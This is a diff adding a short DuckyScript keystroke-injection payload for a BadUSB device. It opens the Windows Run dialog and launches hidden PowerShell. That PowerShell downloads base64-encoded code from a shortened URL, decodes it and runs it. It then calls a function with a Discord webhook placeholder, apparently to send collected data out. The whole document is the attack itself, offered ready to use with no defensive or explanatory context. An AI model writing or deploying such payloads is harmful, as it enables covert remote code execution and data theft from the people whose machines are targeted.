@@ -1,0 +1,6 @@
+DELAY 2000
+GUI r
+DELAY 1000
+STRING powershell -NoP -W H iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((iwr t.ly/VF8W_).Content)));AR -wh 'YOUR_DISCORD_WEBHOOK'
+DELAY 1000
+ENTER
